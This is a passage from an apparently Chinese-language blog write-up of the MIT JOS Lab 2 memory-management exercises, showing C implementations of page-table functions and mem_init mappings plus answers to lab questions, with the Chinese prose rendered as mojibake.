(<span class="hljs-type">pte_t</span>*) ((<span class="hljs-type">uint32_t</span>) KADDR(pgdir[pde_idx]) &amp; (~(PGSIZE - <span class="hljs-number">1</span>)));<br><br><span class="hljs-keyword">return</span> &amp;page_table[PTX(va)];<br>&#125;<br></code></pre></td></tr></table></figure><h4 id="boot-map-region-ï¼šå»ºç«‹è™šæ‹Ÿåœ°å€åŒºåŸŸåˆ°ç‰©ç†åœ°å€åŒºåŸŸæ˜ å°„">boot_map_region()ï¼šå»ºç«‹è™šæ‹Ÿåœ°å€åŒºåŸŸåˆ°ç‰©ç†åœ°å€åŒºåŸŸæ˜ å°„</h4><p>æƒ¯ä¾‹å…ˆçœ‹æ³¨é‡Šï¼Œä¸»è¦æ˜¯å»ºç«‹è™šæ‹Ÿåœ°å€ <code>[va, va+size)</code> åˆ°ç‰©ç†åœ°å€ <code>[pa, pa+size)</code> ä¹‹é—´çš„æ˜ å°„ï¼Œæç¤ºæˆ‘ä»¬ä½¿ç”¨ <code>pgdir_walk()</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">//</span><br><span class="hljs-comment">// Map [va, va+size) of virtual address space to physical [pa, pa+size)</span><br><span class="hljs-comment">// in the page table rooted at pgdir.  Size is a multiple of PGSIZE, and</span><br><span class="hljs-comment">// va and pa are both page-aligned.</span><br><span class="hljs-comment">// Use permission bits perm|PTE_P for the entries.</span><br><span class="hljs-comment">//</span><br><span class="hljs-comment">// This function is only intended to set up the ``static&#x27;&#x27; mappings</span><br><span class="hljs-comment">// above UTOP. As such, it should *not* change the pp_ref field on the</span><br><span class="hljs-comment">// mapped pages.</span><br><span class="hljs-comment">//</span><br><span class="hljs-comment">// Hint: the TA solution uses pgdir_walk</span><br></code></pre></td></tr></table></figure><p>å¯¹åº”å†™å…¥é¡µè¡¨é¡¹æ¡ç›®å³å¯ï¼Œæ³¨æ„è¿™é‡Œä¸éœ€è¦æ”¹å˜é¡µçš„å¼•ç”¨è®¡æ•°</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-type">void</span><br><span class="hljs-title function_">boot_map_region</span><span class="hljs-params">(<span class="hljs-type">pde_t</span> *pgdir, <span class="hljs-type">uintptr_t</span> va, <span class="hljs-type">size_t</span> size, <span class="hljs-type">physaddr_t</span> pa, <span class="hljs-type">int</span> perm)</span><br>&#123;<br><span class="hljs-comment">// Fill this function in</span><br><br><span class="hljs-type">size_t</span> i;<br><span class="hljs-type">pte_t</span> *cur_pte;<br><br><span class="hljs-keyword">for</span> (i = <span class="hljs-number">0</span>; i &lt; size / PGSIZE; i++)<br>&#123;<br>cur_pte = pgdir_walk(pgdir, (<span class="hljs-type">void</span> *)(va + i * PGSIZE), <span class="hljs-number">1</span>);<br><span class="hljs-keyword">if</span> (!cur_pte)<br>panic(<span class="hljs-string">&quot;out of memory while creating page table!&quot;</span>);<br>*cur_pte = (<span class="hljs-type">pte_t</span>) ((pa + i * PGSIZE) | PTE_P | perm);<br>&#125;<br>&#125;<br></code></pre></td></tr></table></figure><h4 id="page-lookup-ï¼šè¿”å›è™šæ‹Ÿåœ°å€å¯¹åº”-PageInfo-åœ°å€">page_lookup()ï¼šè¿”å›è™šæ‹Ÿåœ°å€å¯¹åº” PageInfo åœ°å€</h4><p>ä¸»è¦æ˜¯è®©æˆ‘ä»¬æŸ¥æ‰¾é¡µè¡¨ï¼Œè¿”å›è™šæ‹Ÿåœ°å€å¯¹åº”çš„ PageInfo</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">//</span><br><span class="hljs-comment">// Return the page mapped at virtual address &#x27;va&#x27;.</span><br><span class="hljs-comment">// If pte_store is not zero, then we store in it the address</span><br><span class="hljs-comment">// of the pte for this page.  This is used by page_remove and</span><br><span class="hljs-comment">// can be used to verify page permissions for syscall arguments,</span><br><span class="hljs-comment">// but should not be used by most callers.</span><br><span class="hljs-comment">//</span><br><span class="hljs-comment">// Return NULL if there is no page mapped at va.</span><br><span class="hljs-comment">//</span><br><span class="hljs-comment">// Hint: the TA solution uses pgdir_walk and pa2page.</span><br><span class="hljs-comment">//</span><br></code></pre></td></tr></table></figure><p>ç›´æ¥ç”¨å‰é¢å†™çš„ <code>pgdir_walk()</code> æ‰¾åˆ°é¡µè¡¨é¡¹å†ç”¨ <code>pa2page()</code> æŠŠç‰©ç†åœ°å€è½¬æˆ PageInfo çš„è™šæ‹Ÿåœ°å€å³å¯ï¼ŒJOS è¿˜æä¾›äº†ä¸€ä¸ªæ–¹ä¾¿çš„é¡µè¡¨é¡¹åˆ°ç‰©ç†åœ°å€è½¬åŒ–çš„å® <code>PTE_ADDR()</code> ï¼ˆä¸€å¼€å§‹ç¬”è€…éƒ½æ˜¯çº¯æ‰‹å†™â€¦ï¼‰</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">struct</span> PageInfo *<br><span class="hljs-title function_">page_lookup</span><span class="hljs-params">(<span class="hljs-type">pde_t</span> *pgdir, <span class="hljs-type">void</span> *va, <span class="hljs-type">pte_t</span> **pte_store)</span><br>&#123;<br><span class="hljs-comment">// Fill this function in</span><br><br><span class="hljs-type">pte_t</span> *pte;<br><br>pte = pgdir_walk(pgdir, va, <span class="hljs-number">0</span>);<br><br><span class="hljs-keyword">if</span> (pte_store)<br>*pte_store = pte;<br>    <br>    <span class="hljs-comment">// page not present</span><br><span class="hljs-keyword">if</span> (!pte || !((*pte) &amp; PTE_P))<br><span class="hljs-keyword">return</span> <span class="hljs-literal">NULL</span>;<br><br><span class="hljs-keyword">return</span> pa2page(PTE_ADDR(*pte));<br>&#125;<br></code></pre></td></tr></table></figure><h4 id="page-remove-ï¼šè§£é™¤é¡µè¡¨è™šæ‹Ÿåœ°å€æ˜ å°„">page_remove()ï¼šè§£é™¤é¡µè¡¨è™šæ‹Ÿåœ°å€æ˜ å°„</h4><p>ä¸»è¦æ˜¯è§£é™¤é¡µè¡¨ä¸Šå¯¹åº”è™šæ‹Ÿåœ°å€åˆ°ç‰©ç†åœ°å€é—´çš„æ˜ å°„</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">//</span><br><span class="hljs-comment">// Unmaps the physical page at virtual address &#x27;va&#x27;.</span><br><span class="hljs-comment">// If there is no physical page at that address, silently does nothing.</span><br><span class="hljs-comment">//</span><br><span class="hljs-comment">// Details:</span><br><span class="hljs-comment">//   - The ref count on the physical page should decrement.</span><br><span class="hljs-comment">//   - The physical page should be freed if the refcount reaches 0.</span><br><span class="hljs-comment">//   - The pg table entry corresponding to &#x27;va&#x27; should be set to 0.</span><br><span class="hljs-comment">//     (if such a PTE exists)</span><br><span class="hljs-comment">//   - The TLB must be invalidated if you remove an entry from</span><br><span class="hljs-comment">//     the page table.</span><br><span class="hljs-comment">//</span><br><span class="hljs-comment">// Hint: The TA solution is implemented using page_lookup,</span><br><span class="hljs-comment">// tlb_invalidate, and page_decref.</span><br><span class="hljs-comment">//</span><br></code></pre></td></tr></table></figure><p>æ¸…ç©ºé¡µè¡¨é¡¹å¹¶å‡å°‘å¼•ç”¨è®¡æ•°å³å¯ï¼Œè‹¥å¼•ç”¨è®¡æ•°ä¸º 0 åˆ™é‡Šæ”¾è¯¥é¡µï¼Œåˆ«å¿˜äº†ä½¿ç”¨ <code>tlb_invalidate()</code> æ¸…é™¤ TLB ä¸­ç¼“å­˜</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">void</span><br><span class="hljs-title function_">page_remove</span><span class="hljs-params">(<span class="hljs-type">pde_t</span> *pgdir, <span class="hljs-type">void</span> *va)</span><br>&#123;<br><span class="hljs-comment">// Fill this function in</span><br><br><span class="hljs-type">pte_t</span> *pte;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">PageInfo</span> *<span class="hljs-title">pp</span>;</span><br><br> <span class="hljs-comment">// get the PageInfo and PTE</span><br>pp = page_lookup(pgdir, va, &amp;pte);<br><span class="hljs-keyword">if</span> (pp)<br>&#123;<br><span class="hljs-comment">// clear PTE</span><br>tlb_invalidate(pgdir, va);<br>*pte = (<span class="hljs-type">pte_t</span>) <span class="hljs-literal">NULL</span>;<br><br><span class="hljs-comment">// decrease refcount</span><br>page_decref(pp);<br>&#125;<br>&#125;<br></code></pre></td></tr></table></figure><h4 id="page-insert-ï¼šå»ºç«‹è™šæ‹Ÿåœ°å€åˆ°ç‰©ç†é¡µæ˜ å°„">page_insert()ï¼šå»ºç«‹è™šæ‹Ÿåœ°å€åˆ°ç‰©ç†é¡µæ˜ å°„</h4><p>å»ºç«‹å•ä¸ªè™šæ‹Ÿåœ°å€åˆ°å•å¼ ç‰©ç†é¡µä¸Šçš„æ˜ å°„ï¼Œåˆ†é…å¹¶å¢åŠ é¡µå¼•ç”¨è®¡æ•°ï¼Œè‹¥å·²æœ‰ä¸€ä¸ªæ˜ å°„åˆ™ç§»é™¤ç°æœ‰æ˜ å°„å¹¶æ¸…ç©º TLB å¯¹åº”æ¡ç›®</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">//</span><br><span class="hljs-comment">// Map the physical page &#x27;pp&#x27; at virtual address &#x27;va&#x27;.</span><br><span class="hljs-comment">// The permissions (the low 12 bits) of the page table entry</span><br><span class="hljs-comment">// should be set to &#x27;perm|PTE_P&#x27;.</span><br><span class="hljs-comment">//</span><br><span class="hljs-comment">// Requirements</span><br><span class="hljs-comment">//   - If there is already a page mapped at &#x27;va&#x27;, it should be page_remove()d.</span><br><span class="hljs-comment">//   - If necessary, on demand, a page table should be allocated and inserted</span><br><span class="hljs-comment">//     into &#x27;pgdir&#x27;.</span><br><span class="hljs-comment">//   - pp-&gt;pp_ref should be incremented if the insertion succeeds.</span><br><span class="hljs-comment">//   - The TLB must be invalidated if a page was formerly present at &#x27;va&#x27;.</span><br><span class="hljs-comment">//</span><br><span class="hljs-comment">// Corner-case hint: Make sure to consider what happens when the same</span><br><span class="hljs-comment">// pp is re-inserted at the same virtual address in the same pgdir.</span><br><span class="hljs-comment">// However, try not to distinguish this case in your code, as this</span><br><span class="hljs-comment">// frequently leads to subtle bugs; there&#x27;s an elegant way to handle</span><br><span class="hljs-comment">// everything in one code path.</span><br><span class="hljs-comment">//</span><br><span class="hljs-comment">// RETURNS:</span><br><span class="hljs-comment">//   0 on success</span><br><span class="hljs-comment">//   -E_NO_MEM, if page table couldn&#x27;t be allocated</span><br><span class="hljs-comment">//</span><br><span class="hljs-comment">// Hint: The TA solution is implemented using pgdir_walk, page_remove,</span><br><span class="hljs-comment">// and page2pa.</span><br><span class="hljs-comment">//</span><br></code></pre></td></tr></table></figure><p>å®˜æ–¹æ¨èç”¨ <code>page_remove()</code> å®Œæˆå¯¹ç°æœ‰é¡µçš„è§£å¼•ç”¨ï¼Œä½†æ˜¯ä¼šé‡å¤è°ƒç”¨ <code>pgdir_walk()</code>ï¼Œæ‰€ä»¥ç¬”è€…ç›´æ¥å±•å¼€æ“ä½œ</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span><br><span class="hljs-title function_">page_insert</span><span class="hljs-params">(<span class="hljs-type">pde_t</span> *pgdir, <span class="hljs-keyword">struct</span> PageInfo *pp, <span class="hljs-type">void</span> *va, <span class="hljs-type">int</span> perm)</span><br>&#123;<br><span class="hljs-comment">// Fill this function in</span><br><span class="hljs-type">pte_t</span> *pte;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">PageInfo</span> *<span class="hljs-title">old_pp</span>;</span><br><br> <span class="hljs-comment">// get pte of va, create it if not exist</span><br>pte = pgdir_walk(pgdir, va, <span class="hljs-number">1</span>);<br><span class="hljs-keyword">if</span> (!pte)<br><span class="hljs-keyword">return</span> -E_NO_MEM;<br><br><span class="hljs-comment">// page already present, dereference it</span><br><span class="hljs-keyword">if</span> ((*pte) &amp; PTE_P)<br>&#123;<br>old_pp = pa2page(PTE_ADDR(*pte));<br><br><span class="hljs-comment">// if insert the same, just set the perm and return</span><br><span class="hljs-keyword">if</span> (old_pp == pp)<br>&#123;<br>*pte = page2pa(pp) | perm | PTE_P;<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br><span class="hljs-comment">// clear PTE</span><br>tlb_invalidate(pgdir, va);<br>*pte = (<span class="hljs-type">pte_t</span>) <span class="hljs-literal">NULL</span>;<br><br><span class="hljs-comment">// decrease refcount</span><br>page_decref(old_pp);<br>&#125;<br><br>pp-&gt;pp_ref++;<br>*pte = page2pa(pp) | perm | PTE_P;<br><br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>åˆ°è¿™é‡Œæ—¶è¿è¡Œ lab2 çš„åˆ†æ•°æ£€æŸ¥ç¨‹åºåº”è¯¥æœ‰ 40 åˆ†äº†</p><h2 id="Part-3-Kernel-Address-Space">Part 3: Kernel Address Space</h2><p>kernel å æ®é«˜ 256MBçš„è™šæ‹Ÿåœ°å€ç©ºé—´è€Œ user ä½¿ç”¨å‰©ä½™çš„è™šæ‹Ÿåœ°å€ç©ºé—´</p><h3 id="Permissions-and-Fault-Isolation">Permissions and Fault Isolation</h3><p>å› ä¸ºä¸€å¼ é¡µç›®å½•è¡¨åŒæ—¶æ˜ å°„äº†ç”¨æˆ·ç©ºé—´ä¸å†…æ ¸ç©ºé—´ï¼Œå› æ­¤æˆ‘ä»¬éœ€è¦é€šè¿‡é¡µè¡¨ä¸­çš„æƒé™ä½é™åˆ¶ç”¨æˆ·å¯¹ä¸€äº›åœ°å€ç©ºé—´çš„è®¿é—®ï¼š</p><ul><li>å¯¹äº <code>ULIM</code> å¾€é«˜åœ°å€çš„å†…å­˜ï¼Œç”¨æˆ·æ— æƒè®¿é—®</li><li>å¯¹äº <code>[UTOP, ULIM)</code> è¿™å—åŒºåŸŸçš„å†…å­˜ï¼Œç”¨æˆ·ä¸å†…æ ¸éƒ½<strong>åªæœ‰åªè¯»æƒé™</strong>ï¼Œè¿™å—åŒºåŸŸçš„æ˜ å°„å°†é¡µè¡¨ã€PageInfo æ•°ç»„ç­‰ç»“æ„æš´éœ²ç»™ç”¨æˆ·ï¼Œä½†åªæœ‰ä½äºå†…æ ¸ç©ºé—´çš„æ˜ å°„å¯ä»¥å†™å…¥é¡µè¡¨ä¸ PageInfo æ•°ç»„</li></ul><h3 id="Initializing-the-Kernel-Address-Space">Initializing the Kernel Address Space</h3><p>æ¥ä¸‹æ¥æ˜¯ Exercise 5ï¼šå®Œæˆ <code>mem_init()</code> çš„å‰©ä½™éƒ¨åˆ†</p><blockquote><p><strong>Exercise 5.</strong> Fill in the missing code in <code>mem_init()</code> after the call to <code>check_page()</code>.</p><p>Your code should now pass the <code>check_kern_pgdir()</code> and <code>check_page_installed_pgdir()</code> checks.</p></blockquote><h4 id="mem-init-ï¼šï¼ˆpart2ï¼‰">mem_init()ï¼šï¼ˆpart2ï¼‰</h4><p>ç›®å…‰æ”¾å› <code>mem_init()</code>ï¼Œæ¥ä¸‹æ¥åˆåˆ°äº†è¯¥æˆ‘ä»¬è¡¥å…¨çš„åœ°æ–¹ï¼šå°† pages æ˜ å°„åˆ°çº¿æ€§åœ°å€ <code>UPAGES</code> ä¸Šï¼Œæ–°å»ºæ˜ å°„çš„æƒé™åº”ä¸ºç”¨æˆ·ä¸å†…æ ¸éƒ½å¯è¯»ï¼Œä½† pages ç»“æ„ä½“åº”å½“ä¸ºå†…æ ¸å¯è¯»å†™è€Œç”¨æˆ·ä¸å¯çŸ¥ï¼Œå› æ­¤åº”å½“å»ºç«‹æ–°çš„æ˜ å°„ï¼Œè¿™é‡Œè¯¥ç”¨ä¸Šæˆ‘ä»¬ä¹‹å‰å†™çš„ <code>boot_map_region()</code> äº†</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">//////////////////////////////////////////////////////////////////////</span><br><span class="hljs-comment">// Now we set up virtual memory</span><br><br><span class="hljs-comment">//////////////////////////////////////////////////////////////////////</span><br><span class="hljs-comment">// Map &#x27;pages&#x27; read-only by the user at linear address UPAGES</span><br><span class="hljs-comment">// Permissions:</span><br><span class="hljs-comment">//    - the new image at UPAGES -- kernel R, user R</span><br><span class="hljs-comment">//      (ie. perm = PTE_U | PTE_P)</span><br><span class="hljs-comment">//    - pages itself -- kernel RW, user NONE</span><br><span class="hljs-comment">// Your code goes here:</span><br>boot_map_region(kern_pgdir, UPAGES, <br>ROUNDUP(<span class="hljs-keyword">sizeof</span>(<span class="hljs-keyword">struct</span> PageInfo) * npages, PGSIZE), PADDR(pages), <br>PTE_U);<br></code></pre></td></tr></table></figure><p>ç„¶ååˆ°åˆå§‹åŒ–å†…æ ¸æ ˆäº†ï¼Œè¿™é‡Œå†…æ ¸æ ˆè¢«åˆ†ä¸ºä¸¤å—ï¼š</p><ul><li>å¸¸è§„çš„å¯è¯»å†™å†…æ ¸æ ˆ</li><li>å†…æ ¸æ ˆä¿æŠ¤é¡µé¢ï¼Œè¯»å†™åˆ°è¯¥é¡µé¢ä¸Šæ—¶è¯´æ˜æ ˆçˆ†äº†ï¼Œç§°ä¸º guard page</li></ul><p>guard page ä¸éœ€è¦æˆ‘ä»¬å»ºç«‹æ–°çš„æ˜ å°„ï¼Œå› ä¸ºå¦‚æœçˆ†æ ˆäº†è¯»å†™åˆ° guard page è‡ªç„¶ä¼šè§¦å‘ page faultï¼Œè¿™æ—¶æˆ‘ä»¬ä¾¿çŸ¥é“çˆ†æ ˆäº†</p><p>éœ€è¦æ³¨æ„å†…æ ¸æ ˆåº”ä»…ä¸ºå†…æ ¸å¯è¯»å†™ï¼Œåº”è®¾ç½®é¡µè¡¨é¡¹çš„ Supervisor æƒé™ä½ï¼Œå³ä¸ä½¿ç”¨ <code>PTE_U</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">//////////////////////////////////////////////////////////////////////</span><br><span class="hljs-comment">// Use the physical memory that &#x27;bootstack&#x27; refers to as the kernel</span><br><span class="hljs-comment">// stack.  The kernel stack grows down from virtual address KSTACKTOP.</span><br><span class="hljs-comment">// We consider the entire range from [KSTACKTOP-PTSIZE, KSTACKTOP)</span><br><span class="hljs-comment">// to be the kernel stack, but break this into two pieces:</span><br><span class="hljs-comment">//     * [KSTACKTOP-KSTKSIZE, KSTACKTOP) -- backed by physical memory</span><br><span class="hljs-comment">//     * [KSTACKTOP-PTSIZE, KSTACKTOP-KSTKSIZE) -- not backed; so if</span><br><span class="hljs-comment">//       the kernel overflows its stack, it will fault rather than</span><br><span class="hljs-comment">//       overwrite memory.  Known as a &quot;guard page&quot;.</span><br><span class="hljs-comment">//     Permissions: kernel RW, user NONE</span><br><span class="hljs-comment">// Your code goes here:</span><br>boot_map_region(kern_pgdir, KSTACKTOP - KSTKSIZE, KSTKSIZE, <br>PADDR(bootstack), PTE_W);<br></code></pre></td></tr></table></figure><p>æœ€åæ˜¯å»ºç«‹å†…æ ¸ç©ºé—´çš„æ˜ å°„ï¼Œå°†é«˜è™šæ‹Ÿåœ°å€å¤„çš„å†…æ ¸æ˜ å°„åˆ°ç‰©ç†åœ°å€èµ·å§‹å¤„</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">//////////////////////////////////////////////////////////////////////</span><br><span class="hljs-comment">// Map all of physical memory at KERNBASE.</span><br><span class="hljs-comment">// Ie.  the VA range [KERNBASE, 2^32) should map to</span><br><span class="hljs-comment">//      the PA range [0, 2^32 - KERNBASE)</span><br><span class="hljs-comment">// We might not have 2^32 - KERNBASE bytes of physical memory, but</span><br><span class="hljs-comment">// we just set up the mapping anyway.</span><br><span class="hljs-comment">// Permissions: kernel RW, user NONE</span><br><span class="hljs-comment">// Your code goes here:</span><br>boot_map_region(kern_pgdir, KERNBASE,<br>ROUNDUP(<span class="hljs-number">0xffffffff</span> - KERNBASE, PGSIZE), <br><span class="hljs-number">0</span>, PTE_W);<br></code></pre></td></tr></table></figure><p>å®Œæˆè¿™ä¸€åˆ‡ä¹‹åè¿è¡Œåˆ†æ•°åˆ¤æ–­ç¨‹åºï¼Œå…¨éƒ¨é€šè¿‡ï¼Œè‡³æ­¤ï¼Œlab2 çš„æ‰€æœ‰ç¼–ç¨‹ç»ƒä¹ å®Œç¾é€šè¿‡</p><p><img src="https://s2.loli.net/2022/03/15/IGJUqd92siweVzg.png" alt="image.png"></p><p>ä¸‹é¢æ˜¯ä¹ é¢˜ Time</p><blockquote><p><strong>Question</strong></p><ol><li><p>What entries (rows) in the page directory have been filled in at this point? What addresses do they map and where do they point? In other words, fill out this table as much as possible:</p><table><thead><tr><th>Entry</th><th>Base Virtual Address</th><th>Points to (logically):</th></tr></thead><tbody><tr><td>1023</td><td>?</td><td>Page table for top 4MB of phys memory</td></tr><tr><td>1022</td><td>?</td><td>?</td></tr><tr><td>.</td><td>?</td><td>?</td></tr><tr><td>.</td><td>?</td><td>?</td></tr><tr><td>.</td><td>?</td><td>?</td></tr><tr><td>2</td><td>0x00800000</td><td>?</td></tr><tr><td>1</td><td>0x00400000</td><td>?</td></tr><tr><td>0</td><td>0x00000000</td><td>[see next question]</td></tr></tbody></table><p><s>ç ´é¢˜ğŸ•éƒ½ä¸åš</s></p></li><li><p>We have placed the kernel and user environment in the same address space. Why will user programs not be able to read or write the kernelâ€™s memory? What specific mechanisms protect the kernel memory?</p><p>ç”±äºé¡µè¡¨é¡¹ç›¸å…³æƒé™ä½çš„å­˜åœ¨ï¼Œå¯¼è‡´ç”¨æˆ·è¿›ç¨‹ï¼ˆè¿è¡Œåœ¨ ring3ï¼‰æ— æ³•è¯»å†™å†…æ ¸çš„å†…å­˜ç©ºé—´ï¼Œå†…å­˜åˆ†é¡µæœºåˆ¶ä¿æŠ¤äº†å†…æ ¸å†…å­˜</p></li><li><p>What is the maximum amount of physical memory that this operating system can support? Why?</p><p>æ“ä½œç³»ç»Ÿæœ€å¤§å¯æ”¯æŒçš„ç‰©ç†å†…å­˜åº”å½“ä¸º 4GBï¼Œè¿™æ˜¯ä¸€ä¸ª 32 ä½é•¿åº¦çš„åœ°å€èƒ½å¤Ÿè¡¨ç¤ºçš„èŒƒå›´ä¸Šé™</p></li><li><p>How much space overhead is there for managing memory, if we actually had the maximum amount of physical memory? How is this overhead broken down?</p><p>~~çœ‹ä¸æ‡‚é¢˜ç›®ï¼Œæ‘¸äº†ï¼~~å¯¹äºé¡µè¡¨ç»“æ„è€Œè¨€ï¼Œä¸€ä¸ªäºŒçº§é¡µè¡¨åˆšå¥½èƒ½æ»¡è½½ 4GB ç©ºé—´ï¼Œéœ€è¦ä¸€å¼ é¡µç›®å½•è¡¨ä¸ 1024 å¼ é¡µè¡¨ï¼Œæ€»è®¡ <code>4198400</code> å­—èŠ‚ç©ºé—´ï¼›å¯¹äº PageInfo ç»“æ„ä½“æ•°ç»„è€Œè¨€ï¼Œä¸€ä¸ª PageInfo ç»“æ„ä½“å ç”¨çš„ç©ºé—´ä¸º 8 å­—èŠ‚ï¼ˆ4 å­—èŠ‚å¯¹é½ï¼‰ï¼Œé‚£ä¹ˆè¦ç®¡ç† 4GB çš„ç©ºé—´æ€»è®¡éœ€è¦ <code>1048576</code> ä¸ª PageInfo ç»“æ„ä½“ï¼Œå æ® <code>8388608</code> å­—èŠ‚çš„ç©ºé—´ï¼›ä¸¤è€…æ€»è®¡æ¶ˆè€— 0.29% çš„å†…å­˜ç©ºé—´ï¼Œç¬”è€…è®¤ä¸ºè¿™ä¸ªå¼€é”€è¿˜æ˜¯æŒºå°çš„</p></li><li><p>Revisit the page table setup in <code>kern/entry.S</code> and <code>kern/entrypgdir.c</code>. Immediately after we turn on paging, EIP is still a low number (a little over 1MB). At what point do we transition to running at an EIP above KERNBASE? What makes it possible for us to continue executing at a low EIP between when we enable paging and when we begin running at an EIP above KERNBASE? Why is this transition necessary?</p><p>å› ä¸ºåœ¨å¯ç”¨åˆ†é¡µä¹‹åä½ 1MB çš„çº¿æ€§ç©ºé—´ä»ç„¶æ˜ å°„åˆ°ä½ 1MB çš„ç‰©ç†ç©ºé—´ï¼Œå› æ­¤æ­¤æ—¶ä»èƒ½æ­£å¸¸è¿è¡Œï¼›åœ¨ <code>call i386_init</code> æ—¶è·³è½¬åˆ° <code>kern/init.c</code> ä¸­çš„ <code>i386_init()</code> å‡½æ•°ï¼Œæ­¤æ—¶ eip ä¾¿ä½äºå†…æ ¸è™šæ‹Ÿåœ°å€ç©ºé—´ä¸­äº†ï¼›åœ¨é¡µè¡¨ä¸­å»ºç«‹åŒé‡æ˜ å°„ï¼›å› ä¸ºåœ¨å¼€å¯åˆ†é¡µä¹‹å eip æš‚æ—¶è¿˜è¿è¡Œåœ¨ä½åœ°å€ç©ºé—´ï¼Œå› æ­¤è¦å…ˆæœ‰ä¸ªä¸´æ—¶çš„åŒé‡æ˜ å°„ä¿è¯è¿›å…¥å†…æ 